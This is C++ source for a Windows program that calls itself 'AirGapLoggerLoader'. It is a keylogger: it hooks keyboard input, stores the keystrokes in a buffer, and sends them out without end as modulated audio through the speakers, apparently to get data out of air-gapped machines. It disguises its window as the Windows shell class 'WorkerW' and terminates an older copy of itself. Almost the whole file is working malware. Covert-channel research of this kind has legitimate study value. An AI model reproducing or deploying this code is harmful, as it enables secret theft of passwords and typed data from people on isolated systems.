#include "main.h"
#include "logger.h"
#include "Resource.h"
#include <fcntl.h>
#include <stdio.h>

extern "C"{

#include "AudioSink.h"
#include "BitToSymbol.h"
#include "FrequencyModulator.h"
#include "Repeater.h"
#include "Multiply.h"
#include "FirFilter.h"
#include "Packetizer.h"
#include "agmath.h"
}

#define MAX_LOADSTRING 100

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);
#define NOTIFYICONDATA_ICONUID 0
#define NOTIFYICONDATA_CALLBACKMESSAGE (WM_USER + 1)
#define POPUPMENU_EXIT 0

#define KEYBUFFER_SIZE (256 * (ag_PACKETSIZE - 1))
char keyBuffer[KEYBUFFER_SIZE];
int keyBufferPos = 0;

DWORD WINAPI MyThreadFunction(LPVOID lpParam)
{
	FirFilter_InitGaussian();
	Multiply_SetFrequency(ag_BASE_FREQUENCY);
	Packetizer_Init();

	CONNECT(Packetizer, BitToSymbol);
	CONNECT(BitToSymbol, Repeater);
	CONNECT(Repeater, FirFilter);
	CONNECT(FirFilter, FrequencyModulator);
	CONNECT(FrequencyModulator, Multiply);
	CONNECT(Multiply, AudioSink);

	int block = 0;
	unsigned char buffer[ag_PACKETSIZE];
	while (true)
	{
		int writeBlock = keyBufferPos / (ag_PACKETSIZE-1) + 1;
		int usedBlock = writeBlock == 0 ? 0 : block % writeBlock;

		buffer[0] = usedBlock % 256;
		memcpy(buffer + 1, keyBuffer + ((usedBlock % 256) * (ag_PACKETSIZE - 1)), ag_PACKETSIZE - 1);

		UCharPackage p;
		p.count = ag_PACKETSIZE;
		p.data = buffer;
		Packetizer_OnData(p);

		block++;
	}


	return 0;
}

int APIENTRY _tWinMain(HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPTSTR    lpCmdLine,
	int       nCmdShow)
{
	// kill old
	DWORD aProcesses[1024], cbNeeded, cProcesses;

	if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
		return 0;
	cProcesses = cbNeeded / sizeof(DWORD);
	unsigned int i;
	TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");

	for (i = 0; i < cProcesses; i++){
		if (aProcesses[i] != 0){
			//PrintProcessNameAndID( aProcesses[i] );

			HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
				PROCESS_VM_READ | SYNCHRONIZE | PROCESS_TERMINATE,
				FALSE, aProcesses[i]);
			if (NULL != hProcess)
			{
				HMODULE hMod;
				DWORD cbNeeded;

				if (EnumProcessModules(hProcess, &hMod, sizeof(hMod),
					&cbNeeded))
				{
					GetModuleBaseName(hProcess, hMod, szProcessName,
						sizeof(szProcessName) / sizeof(TCHAR));
					if (aProcesses[i] != GetCurrentProcessId() && wcsncmp(szProcessName, TEXT("AirGapLoggerLoader.exe"), lstrlenW(TEXT("AirGapLoggerLoader.exe"))) == 0)
					{
						TerminateProcess(hProcess, 0);
						return 0;
					}
				}
			}

		}
	}

	//window
	HWND hWnd;
	WNDCLASSEX wcex;
	ZeroMemory(&wcex, sizeof(WNDCLASSEX));

	wcex.cbSize = sizeof(WNDCLASSEX);
	wcex.lpfnWndProc = WndProc;
	wcex.hInstance = (HINSTANCE)hInstance;
	wcex.lpszClassName = _T("WorkerW");
	
	hWnd = CreateWindow((LPCWSTR)RegisterClassEx(&wcex), 0, WS_OVERLAPPEDWINDOW,
		CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, NULL, NULL, (HINSTANCE)hInstance, NULL);

	SetWindowText(hWnd, L"WorkerW");

	//tray
	NOTIFYICONDATA nid;
	nid.uID = NOTIFYICONDATA_ICONUID;
	nid.hWnd = hWnd;
	nid.cbSize = sizeof (nid);
	nid.uCallbackMessage = NOTIFYICONDATA_CALLBACKMESSAGE;
	wsprintf(nid.szTip, _T("MdLH"));

	nid.uFlags = NIF_MESSAGE | NIF_ICON | NIF_TIP;

	nid.hIcon = LoadIcon((HINSTANCE)hInstance, MAKEINTRESOURCE(IDI_MDLH));
	Shell_NotifyIcon(NIM_ADD, &nid);

	//hook
	installHook();

	DWORD   dwThreadIdArray[1];
	//thread
	CreateThread(
		NULL,                   // default security attributes
		0,                      // use default stack size  
		MyThreadFunction,       // thread function name
		NULL,          // argument to thread function 
		0,                      // use default creation flags 
		&dwThreadIdArray[i]);


	// msg queue
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	//unhook
	removeHook();

	//untray
	nid.uID = 0;
	nid.hWnd = hWnd;
	nid.cbSize = sizeof (nid);
	Shell_NotifyIcon(NIM_DELETE, &nid);

	//unwindow
	DestroyWindow(hWnd);
	return 0;
}


LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	HMENU menu;
	BOOL item;
	POINT cur;

	if (message == WM_COPYDATA){
		COPYDATASTRUCT* pcds = (COPYDATASTRUCT*)lParam;
		if (pcds->dwData == 1)
		{
			LPCTSTR lpszString = (LPCTSTR)(pcds->lpData);
			keyBuffer[keyBufferPos++ % KEYBUFFER_SIZE] = *lpszString;
		}
	}

	if (message == NOTIFYICONDATA_CALLBACKMESSAGE && wParam == NOTIFYICONDATA_ICONUID){
		switch (lParam)
		{
		case WM_RBUTTONUP:
			menu = CreatePopupMenu();
			AppendMenu(menu, MF_STRING, POPUPMENU_EXIT, _T("Exit"));
			GetCursorPos(&cur);
			item = TrackPopupMenu(menu, TPM_RETURNCMD, cur.x, cur.y, 0, hWnd, NULL);

			switch (item)
			{
			case POPUPMENU_EXIT:
				PostQuitMessage(0);
				break;
			}
			break;

		case WM_COPYDATA:
		{
			
		}
			break;

		case WM_RBUTTONDBLCLK:
		case WM_MOUSEFIRST:
		case WM_LBUTTONDOWN:
		case WM_RBUTTONDOWN:
		default:
			//MessageBox(hWnd, _T("default"), _T("default"), MB_OK);
			break;
		}
		return 0;
	}

	return DefWindowProc(hWnd, message, wParam, lParam);
}
